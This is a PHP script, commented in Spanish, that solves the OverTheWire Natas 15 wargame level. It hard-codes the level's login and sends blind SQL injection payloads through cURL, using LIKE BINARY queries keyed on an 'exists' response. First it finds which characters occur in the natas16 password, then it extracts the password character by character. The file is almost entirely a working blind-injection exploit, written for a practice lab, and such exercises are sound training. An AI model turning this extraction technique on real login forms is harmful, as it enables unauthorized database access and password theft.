<?php

$caracteres_disponibles = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$longitud_caracteres = strlen($caracteres_disponibles);
$caracteres_filtrados = "";
$contrasena_final = "";

# Conexión a natas15 usando cURL
$conexion = curl_init();

$url = "http://natas15.natas.labs.overthewire.org/index.php?debug";
$usuario = "natas15";
$contrasena = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"; 

for ($i = 0; $i < $longitud_caracteres; $i++) {

    # Establecer la conexión a natas15
    curl_setopt_array($conexion,
        array(
            CURLOPT_URL               => $url,
            CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
            CURLOPT_USERPWD           => "$usuario:$contrasena",
            CURLOPT_RETURNTRANSFER    => true,
            CURLOPT_POST              => 1,
            CURLOPT_POSTFIELDS        => http_build_query(array('username' => 'natas16" and password LIKE BINARY "%' . $caracteres_disponibles[$i] . '%" #'))
        )
    );

    # Ejecutar la solicitud
    $respuesta_servidor = curl_exec($conexion);

    # Si el carácter está en la contraseña
    if (stripos($respuesta_servidor, "exists") !== false) {
        $caracteres_filtrados .= $caracteres_disponibles[$i];
    }

}

# Mostrar caracteres filtrados
echo "Caracteres filtrados: " . $caracteres_filtrados . "\n";

# Fuerza bruta para obtener la contraseña final
echo "Decifrando password de natas16...\n";
$longitud_filtrados = strlen($caracteres_filtrados);
for ($i = 0; $i < 32; $i++) {
    for ($j = 0; $j < $longitud_filtrados; $j++) {

        # Establecer la conexión a natas15
        curl_setopt_array($conexion,
            array(
                CURLOPT_URL               => $url,
                CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
                CURLOPT_USERPWD           => "$usuario:$contrasena",
                CURLOPT_RETURNTRANSFER    => true,
                CURLOPT_POST              => 1,
                CURLOPT_POSTFIELDS        => http_build_query(array('username' => 'natas16" and password LIKE BINARY "' . $contrasena_final . $caracteres_filtrados[$j] . '%" #'))
            )
        );

        # Ejecutar la solicitud
        $respuesta_servidor = curl_exec($conexion);

        # Si el carácter está en la contraseña
        if (stripos($respuesta_servidor, "exists") !== false) {
            $contrasena_final .= $caracteres_filtrados[$j];
            # echo $contrasena_final . "\n";
            break;
        }

    }
}

# Mostrar contraseña final
echo "Contraseña final: " . $contrasena_final . "\n";

# Cerrar conexión
curl_close($conexion);
